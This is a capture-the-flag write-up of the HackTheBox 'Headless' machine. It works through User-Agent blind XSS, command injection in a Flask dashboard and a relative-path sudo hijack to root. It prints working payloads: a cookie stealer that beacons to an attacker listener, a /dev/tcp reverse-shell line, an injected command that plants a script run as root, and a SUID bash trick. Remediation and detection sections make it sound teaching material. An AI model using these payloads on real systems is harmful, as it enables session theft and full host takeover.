---
layout: default
title: "HackTheBox - Headless"
---

# HackTheBox - Headless

**OS:** Linux (Debian 12, Python/Flask web app)

Headless is a Linux machine built around a single custom Flask application served by Werkzeug on
port 5000. The public site is a simple "Under Construction" page that hands every visitor a
signed `is_admin="user"` cookie, plus a `/support` contact form. The form filters cross-site
scripting in the message body but not in the request headers, and any submission it flags as a
"hacking attempt" is reviewed by an administrator out of band. Smuggling a cookie-stealing
payload through the `User-Agent` header of a flagged request fires in the admin's browser and
leaks an `is_admin="admin"` cookie. That cookie unlocks an administrator dashboard whose
"Generate Report" feature concatenates the `date` parameter straight into a shell command,
giving remote code execution as the `dvir` user. From there, `dvir` may run `/usr/bin/syscheck`
as root via `sudo`, and that script invokes `./initdb.sh` by a relative path, so planting a
malicious `initdb.sh` in a writable working directory and running the sudo command yields a root
shell.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (headless) |
| Initial Access | Header-based blind XSS -> admin cookie theft -> authenticated command injection (RCE as `dvir`) |
| Privilege Escalation | `sudo` script with a relative-path `./initdb.sh` call -> writable-CWD hijack |
| Final Access | `root` |

---

## Recon

### Port Scan

A full TCP scan returned only two open ports: SSH and a high HTTP port served by Werkzeug, the
development server that ships with Python's Flask.

```
$ nmap -p- --min-rate 5000 -oN nmap-full.txt <target-ip>
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

$ nmap -sCV -p22,5000 <target-ip>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Under Construction
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why this works:** nmap fingerprints 5000 as `upnp` from its port-number guess, but the
> `-sCV` service probe corrects it to `Werkzeug httpd 2.2.2 (Python 3.11.2)`. Always confirm the
> banner; the default service name from a top-ports sweep is a guess, not a fact. A bare Werkzeug
> server on a HackTheBox box almost always means a custom Flask app, so the attack surface is the
> application logic, not a known CVE.

### Mapping the Application

The index page is an "Under Construction" placeholder, but the `Set-Cookie` header on the
response is the first interesting signal:

```
$ curl -s -i http://<target-ip>:5000/
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
Content-Length: 2799
...
        <a href="/support" class="button">For questions</a>
```

The cookie value is two dot-separated parts: a base64 payload and a signature.

```
$ echo 'InVzZXIi' | base64 -d
"user"
```

So the cookie literally encodes the string `"user"`, signed by the server. The `/` page also
links to `/support`.

> **Why this works:** `is_admin=InVzZXIi.<sig>` is the classic shape of a signed token (here an
> `itsdangerous`-style payload.signature, the library Flask uses). The payload base64-decodes to
> `"user"`, which strongly implies an `"admin"` variant exists, but the signature stops us
> forging it ourselves. We cannot flip `user` to `admin` without the server's secret key, so the
> goal becomes getting the server (or a privileged user) to hand us a pre-signed admin cookie.

Content discovery and manual probing surface a `/dashboard` endpoint that is gated on the admin
cookie. With the default `user` cookie it returns `401 Unauthorized`:

```
$ curl -s -i -b 'is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs' http://<target-ip>:5000/dashboard
HTTP/1.1 401 UNAUTHORIZED
Server: Werkzeug/2.2.2 Python/3.11.2
...
<title>401 Unauthorized</title>
```

The `/support` page is a contact form posting back to itself:

```
$ curl -s http://<target-ip>:5000/support | grep -iE '<form|<input|<textarea'
        <form method="POST">
            <input type="text"  id="fname"   name="fname"   required>
            <input type="text"  id="lname"   name="lname"   required>
            <input type="email" id="email"   name="email"   required>
            <input type="tel"   id="phone"   name="phone"   required>
            <textarea           id="message" name="message" required></textarea>
```

The two facts that define the box: `/dashboard` needs an `is_admin="admin"` cookie we cannot
forge, and `/support` is a form a human reviews. That points at stealing an admin's cookie via
stored/blind XSS.

## Initial Access

### Probing the Support Form's Filtering

A benign submission is accepted. A submission with an obvious script tag in the `message` body is
rejected with a "Hacking Attempt Detected" page:

```
$ curl -s -X POST http://<target-ip>:5000/support \
    --data-urlencode 'fname=a' --data-urlencode 'lname=b' \
    --data-urlencode 'email=a@b.c' --data-urlencode 'phone=1' \
    --data-urlencode 'message=hello'
... Contact Support ...                      # accepted

$ curl -s -X POST http://<target-ip>:5000/support \
    --data-urlencode 'message=<script>alert(1)</script>' ...
... Hacking Attempt Detected ...             # rejected, request logged for admin review
```

> **Gotcha worth recording:** the "Hacking Attempt Detected" response is not just a block, it is
> the trigger. Flagged requests are recorded and surfaced to an administrator who reviews them in
> a browser. The body content is filtered, but the *request metadata* shown on that review page
> (notably the `User-Agent`) is rendered without the same sanitisation. The body filter is the
> bait; the header is the delivery channel. Submitting a clean form never gets reviewed, so the
> payload must also flag the request.

### Header-Based Blind XSS to Steal the Admin Cookie

Stand up a listener on the attack box to catch the callback (the box egresses to the VPN, so any
port works; 8000 is convenient):

```
$ python3 -m http.server 8000 --bind <tun0-ip>
Serving HTTP on <tun0-ip> port 8000 ...
```

Submit a request that is **flagged** (script tag in `message`, to force admin review) while
carrying the cookie stealer in the **`User-Agent`** header:

```
$ curl -s -X POST http://<target-ip>:5000/support \
    -A '<script>document.location="http://<tun0-ip>:8000/?c="+document.cookie</script>' \
    --data-urlencode 'fname=test' --data-urlencode 'lname=test' \
    --data-urlencode 'email=a@a.com' --data-urlencode 'phone=1' \
    --data-urlencode 'message=<script>alert(1)</script>'
```

When the administrator opens the flagged report, the `User-Agent` payload executes in their
session and the browser beacons their cookie back:

```
$ python3 -m http.server 8000 --bind <tun0-ip>
Serving HTTP on <tun0-ip> port 8000 ...
<target-ip> - - [25/Jun/2026 00:48:15] "GET /?c=is_admin=ImFkbWluIg.<redacted-sig> HTTP/1.1" 200 -
```

Decode the captured cookie's payload:

```
$ echo 'ImFkbWluIg' | base64 -d
"admin"
```

This is the pre-signed `is_admin="admin"` cookie we could not forge, now handed to us with a
valid signature.

> **Why this works:** `document.cookie` is readable because the `is_admin` cookie is set without
> the `HttpOnly` flag (`Set-Cookie: is_admin=...; Path=/`, no `HttpOnly`). The XSS runs in the
> admin's origin, so it reads the admin's signed cookie and exfiltrates it. We never needed the
> server's signing key, the privileged user signed the token for us. This is the core lesson of
> blind/stored XSS: you borrow the victim's authenticated context.

### Authenticated Dashboard and Command Injection

Replaying the stolen admin cookie unlocks `/dashboard`, an "Administrator Dashboard" with a
single "Generate Report" form that takes a `date` value:

```
$ curl -s -b 'is_admin=ImFkbWluIg.<redacted-sig>' http://<target-ip>:5000/dashboard \
    | grep -iE '<h1>|<form|<input'
        <h1>Administrator Dashboard</h1>
        <form action="/dashboard" method="post">
            <input type="date" id="date" name="date" value="2023-09-15" required>
```

A normal POST returns "Systems are up and running!". Appending a shell separator to the `date`
value executes an injected command, the output is reflected in the response:

```
$ curl -s -b 'is_admin=ImFkbWluIg.<redacted-sig>' -X POST http://<target-ip>:5000/dashboard \
    --data-urlencode 'date=2023-09-15;id'
...
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
```

> **Why this works:** the dashboard builds a shell command from the `date` field (a health-check
> report) and runs it without sanitising or quoting the input, so `;id` terminates the intended
> command and runs ours. The `date` field looks innocuous because the front-end is a
> `<input type="date">` picker, but server-side validation is absent, the client-side widget is
> not a control. This is textbook OS command injection.

### User Flag

With code execution as `dvir`, read the flag directly through the injection channel:

```
$ curl -s -b 'is_admin=ImFkbWluIg.<redacted-sig>' -X POST http://<target-ip>:5000/dashboard \
    --data-urlencode 'date=;id;hostname;cat /home/dvir/user.txt'
...
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
headless
<user-flag-redacted>
```

For interactive work a reverse shell can be staged the same way (URL-encode a
`bash -i >& /dev/tcp/<tun0-ip>/<port> 0>&1` payload into the `date` field and catch it on the
attack box); the injection channel alone is sufficient for the full chain on this box.

## Privilege Escalation

### sudo Enumeration

```
$ curl -s -b 'is_admin=ImFkbWluIg.<redacted-sig>' -X POST http://<target-ip>:5000/dashboard \
    --data-urlencode 'date=;sudo -l'
...
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

`dvir` can run `/usr/bin/syscheck` as root with no password. Read the script before abusing it:

```
$ curl -s -b 'is_admin=ImFkbWluIg.<redacted-sig>' -X POST http://<target-ip>:5000/dashboard \
    --data-urlencode 'date=;cat /usr/bin/syscheck'
...
#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  exit 1
fi
last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"
load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi
exit 0
```

> **Gotcha worth recording:** every command in the script except one is called by absolute path
> (`/usr/bin/find`, `/usr/bin/date`, ...). The single exception is `./initdb.sh`, a **relative**
> path. When `dvir` runs `sudo /usr/bin/syscheck`, the script executes `./initdb.sh` from
> whatever directory `dvir` was in, as root. There is no `initdb.sh` in a system path, so if the
> current working directory is writable, we control what runs.

### Writable-CWD Hijack of initdb.sh

Plant a malicious `initdb.sh` in a writable directory, then invoke the sudo command from that
same directory so the relative-path call picks up our file as root. Per the attack-box safety
rule, the only script executed here is one written by hand on the target, a trivial go/no-go:

```
$ curl -s -b 'is_admin=ImFkbWluIg.<redacted-sig>' -X POST http://<target-ip>:5000/dashboard \
    --data-urlencode 'date=;cd /tmp && printf "#!/bin/bash\nid > /tmp/.r 2>&1\ncat /root/root.txt >> /tmp/.r 2>&1\nchmod 666 /tmp/.r\n" > /tmp/initdb.sh && chmod +x /tmp/initdb.sh && sudo /usr/bin/syscheck >/dev/null 2>&1 ; cat /tmp/.r'
...
uid=0(root) gid=0(root) groups=0(root)
<root-flag-redacted>
```

The planted `initdb.sh` ran with `uid=0(root)`, confirming root code execution. For an
interactive root shell, the same primitive can drop a SUID copy of bash
(`cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash`) and then `/tmp/rootbash -p`, or write
`dvir`'s key into `/root/.ssh/authorized_keys`. Reading the flag is the minimal proof.

### Root Flag

```
<root-flag-redacted>
```

## Root Cause

| Layer | Root cause |
|---|---|
| `/support` XSS | The form filters script content in the message body but renders request metadata (`User-Agent`) unsanitised on the admin review page. Output encoding is applied inconsistently, only to one input, not to every field that reaches the admin's browser. |
| `is_admin` cookie | An authorisation decision is carried in a client-side, non-`HttpOnly` cookie. Signing prevents forgery, but not theft, and `document.cookie` exposes it to any XSS. |
| `/dashboard` | CVE-class OS command injection: the `date` parameter is concatenated into a shell command with no validation, quoting, or use of an argument vector. |
| Host | A `sudo NOPASSWD` script that executes a helper by a relative path (`./initdb.sh`), trusting the caller's working directory. |

The defects chain cleanly: the XSS steals the admin cookie, the cookie unlocks the injectable
dashboard, the injection gives `dvir` code-exec, and the relative-path sudo script promotes
`dvir` to root.

## Impact

Full remote compromise from an unauthenticated starting point. An attacker with only network
access to port 5000 steals an administrator's session through a contact form, executes arbitrary
commands as a service user, and escalates to `root`, total control of the host, its data, and any
credentials stored on it.

## Remediation

Priority-ordered. The first items break the attack chain outright; the rest are hardening.

1. **Fix the privilege escalation: call helpers by absolute path.** Change `syscheck` to invoke
   `/usr/bin/initdb.sh` (or the real install path) and set a safe `PATH`/`cd` inside the script.
   A `sudo` script must never execute anything by a relative path. This single fix removes the
   root step.
2. **Fix the command injection.** Do not build a shell string from user input. Validate `date`
   against a strict format (`YYYY-MM-DD`) and pass it as an argument vector
   (`subprocess.run([...], shell=False)`), never `shell=True` with concatenation.
3. **Fix the stored XSS.** Context-encode every field rendered on the admin review page,
   including request headers like `User-Agent`. Apply output encoding uniformly, not just to the
   message body, and set a restrictive `Content-Security-Policy`.
4. **Harden the session cookie.** Set `HttpOnly` (so XSS cannot read it), `Secure`, and
   `SameSite`; better still, do not encode the authorisation role in a client-held cookie, derive
   it server-side from an authenticated session.
5. **Do not run the app behind the Werkzeug dev server.** Werkzeug's built-in server is for
   development; serve the app via a hardened WSGI server and run it as a sandboxed, unprivileged
   user (systemd `ProtectSystem`, `NoNewPrivileges`, `PrivateTmp`).

### Validation

- Privesc fixed: `sudo -l` as `dvir` no longer yields a path to root; running `sudo syscheck`
  from a writable directory containing a planted `initdb.sh` must not execute that file.
- Injection fixed: POSTing `date=2023-09-15;id` returns a validation error or the literal string,
  not command output.
- XSS fixed: a flagged submission whose `User-Agent` contains `<script>` renders inert (encoded)
  on the admin review page; no outbound request to an attacker host is made.
- Cookie fixed: the `Set-Cookie` response for `is_admin` includes `HttpOnly; Secure; SameSite`,
  and `document.cookie` cannot read it.

## Detection Opportunities

- **Web app**: `/support` POSTs whose headers (`User-Agent`, `Referer`) contain `<script>`,
  `document.cookie`, or `document.location`; `/dashboard` POSTs whose `date` field contains shell
  metacharacters (`;`, `|`, back-ticks, `&&`). Either is a near-certain attack, not a false
  positive on a date picker.
- **Egress**: outbound HTTP from the host to an external/VPN address shortly after a flagged
  support submission, the cookie-exfil beacon (`GET /?c=is_admin=...`).
- **Process**: the Flask/Werkzeug process spawning child shells (`sh`, `bash`, `id`, `cat`) is a
  strong command-injection signal; the app should never fork a shell.
- **Privesc**: `auditd` on `execve` of `/usr/bin/syscheck` via `sudo` by `dvir`, and any
  `initdb.sh` executed from a path outside its install directory. A root process whose parent
  chain is `sudo -> syscheck -> initdb.sh` running out of `/tmp` or a home directory is
  unambiguous.

## Lessons Learned

- Output encoding must be applied to *every* sink that reaches a privileged viewer, not just the
  obvious one. A body filter is worthless if the `User-Agent` lands unescaped on the same admin
  page.
- A signed cookie you cannot forge is still useful if you can steal it. Non-`HttpOnly` plus XSS
  equals borrowed admin context, no signing key required.
- Client-side input widgets (`<input type="date">`) are UX, not validation. Always test the raw
  parameter server-side.
- The fastest GTFOBins-style win on a `sudo` script is to read it and look for relative paths,
  unquoted variables, and writable-directory assumptions. One relative `./initdb.sh` was the
  whole privesc.

## Cleanup

- Removed the planted `initdb.sh` and the `/tmp/.r` output file from the target.
- Left no SUID binaries, accounts, keys, or persistence on the host; the root step read the flag
  and exited.
- Stopped the local cookie-catch HTTP listener on the attack box.
- The stolen admin cookie is a per-instance session token and expires with the box; nothing
  long-lived was retained.
